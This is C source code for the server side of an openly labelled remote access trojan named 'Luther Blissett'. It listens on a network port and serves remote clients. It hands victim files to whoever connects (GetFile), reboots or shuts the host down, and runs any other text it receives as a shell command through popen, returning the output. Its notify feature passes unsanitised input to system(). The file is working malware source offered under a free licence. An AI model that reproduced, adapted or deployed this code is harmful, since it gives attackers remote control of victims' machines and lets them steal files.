/*
 *  Luther Blissett  --  Remote Access Trojan
 *  Copyright (C) 2024  Davide Usberti aka UsboKirishima
 *
 *  Luther Blissett is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  Luther Blissett is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with Luther Blissett.  If not, see <http://www.gnu.org/licenses/>.
 */
#include <Imlib2.h>
#include <X11/Xatom.h>
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <linux/loop.h>
#include <netinet/in.h>
#include <pthread.h>
#include <regex.h>
#include <stdalign.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mount.h>
#include <sys/socket.h>
#include <sys/statvfs.h>
#include <sys/sysinfo.h>
#include <sys/utsname.h>
#include <time.h>
#include <unistd.h>

#include <errors/errors.h>
#include <exploits/getinfo.h>
#include <logs/slog.h>
#include <server/listener.h>
#include <server/server.h>
#include <utils/args.h>

#define MAX 80
#define SA struct sockaddr

char delimiter;
int num_tokens;
char **tokens;

void *handle_client(void *arg)
{
	int connfd = *((int *)arg);
	free(arg);

	char buff[1024];
	char response[1024];
	struct sockaddr_in cliaddr;
	socklen_t cliaddr_len = sizeof(cliaddr);
	getpeername(connfd, (struct sockaddr *)&cliaddr, &cliaddr_len);

	bool is_command = true;

	printf("Connected to client: %s:%d\n", inet_ntoa(cliaddr.sin_addr),
		   ntohs(cliaddr.sin_port));

	for (;;)
	{
		bzero(buff, MAX);

		int n = read(connfd, buff, sizeof(buff));
		if (n <= 0)
		{
			printf("Client %s:%d disconnected or error occurred\n",
				   inet_ntoa(cliaddr.sin_addr), ntohs(cliaddr.sin_port));
			break;
		}

		printf("From client %s:%d: %s\n", inet_ntoa(cliaddr.sin_addr),
			   ntohs(cliaddr.sin_port), buff);

		// parseCommand(buff, connfd);

		/**
		 * =============================================
		 * | Commands
		 */

		/**
		 * Reboot - lb{0x0002}
		 */
		if (strstr(buff, "lb{0x0002}") != NULL)
		{
			is_command = false;
			strcpy(response, "Restarting System");
			write(connfd, response, strlen(response));
			lb_reboot();
		}
		/**
		 * Shutdown - lb{0x0003}
		 */
		if (strstr(buff, "lb{0x0003}") != NULL)
		{
			is_command = false;
			strcpy(response, "Shutting down System");
			write(connfd, response, strlen(response));
			lb_shutdown();
		}
		/**
		 * Notify - lb{0x0004}
		 */
		if (strstr(buff, "lb{0x0004}") != NULL)
		{
			is_command = false;
			const char *notify_token = "lb{0x0004}";
			char *start = strstr(buff, notify_token);

			start += strlen(notify_token);

			char *notify_text = strtok(start, "");

			char fcommand[256];
			snprintf(fcommand, sizeof(fcommand), "notify-send \"%s\"", notify_text);
			system(fcommand);
		}

		/**
		 * GetFile - lb{0x0005}
		 */
		if (strncmp(buff, "lb{0x0005}", 10) == 0)
		{
			is_command = false;
			char *token = strtok(buff, " ");
			char *file_path = strtok(NULL, " ");

			if (file_path == NULL)
			{
				strcpy(response, "Error: Missing file path\n");
				write(connfd, response, strlen(response));
				continue;
			}

			FILE *fp = fopen(file_path, "rb");
			if (fp == NULL)
			{
				snprintf(response, sizeof(response), "Failed to open file: %s\n",
						 file_path);
				write(connfd, response, strlen(response));
			}
			else
			{
				snprintf(response, sizeof(response), "START_FILE_TRANSFER %s\n",
						 file_path);
				write(connfd, response, strlen(response));

				char file_buffer[1024];
				size_t bytes_read;
				while ((bytes_read = fread(file_buffer, 1, sizeof(file_buffer), fp)) >
					   0)
				{
					write(connfd, file_buffer, bytes_read);
				}

				fclose(fp);

				strcpy(response, "END_FILE_TRANSFER\n");
				write(connfd, response, strlen(response));
			}

			return 0;
		}

		/**
		 * Set Wallpaper - lb{0x0006}
		 */
		/*if (strstr(buff, "lb{0x0006}") != NULL) {
			char *filePath = strtok(buff + strlen("lb{0x0006} "), " ");
			if (filePath) {
				setWallpaper(filePath);
				strcpy(buff, "Wallpaper changed");
				write(connfd, buff, strlen(buff));
			}

			return 0;
		}*/

		if (is_command == true)
		{
			FILE *process = popen(buff, "r");
			fgets(response, sizeof(response), process);
			printf("\n%s", response);

			if (process == NULL)
			{
				snprintf(response, sizeof(response), "Failed to run command\n");
			}
			else
			{
				char tmp[1024];
				while (fgets(tmp, sizeof(tmp), process) != NULL)
				{
					strncat(response, tmp, sizeof(response) - strlen(response) - 1);
				}
				pclose(process);
			}
		}

		write(connfd, response, strlen(response));

		if (strncmp("exit", buff, 4) == 0)
		{
			printf("Client %s:%d sent exit. Closing connection.\n",
				   inet_ntoa(cliaddr.sin_addr), ntohs(cliaddr.sin_port));
			break;
		}
	}
	close(connfd);
	return NULL;
}

int lb_server(char HOST[], unsigned short PORT)
{
	int sockfd, connfd, len;
	struct sockaddr_in servaddr, cli;
	int opt = 1;

	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd == -1)
	{
		printf("Socket creation failed...\n");
		exit(0);
	}
	else
		printf("Socket successfully created..\n");
	bzero(&servaddr, sizeof(servaddr));

	if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)))
	{
		printf("setsockopt(SO_REUSEADDR) failed...\n");
		close(sockfd);
		exit(0);
	}

	// assign IP, PORT
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = htonl(htonl(INADDR_ANY));
	servaddr.sin_port = htons(PORT);

	if ((bind(sockfd, (SA *)&servaddr, sizeof(servaddr))) != 0)
	{
		printf("Socket bind failed...\n");
		exit(0);
	}
	else
		printf("Socket successfully binded..\n");

	if ((listen(sockfd, 5)) != 0)
	{
		printf("Listen failed...\n");
		exit(0);
	}
	else
		printf("Server listening..\n");
	len = sizeof(cli);

	while (1)
	{
		connfd = accept(sockfd, (SA *)&cli, &len);
		if (connfd < 0)
		{
			printf("Server accept failed...\n");
			exit(0);
		}
		else
		{
			printf("Server accepted the client...\n");
			pthread_t thread_id;
			int *arg = malloc(sizeof(*arg));
			*arg = connfd;
			pthread_create(&thread_id, NULL, handle_client, arg);
			pthread_detach(thread_id);
		}
	}
	close(sockfd);
	return 0;
}
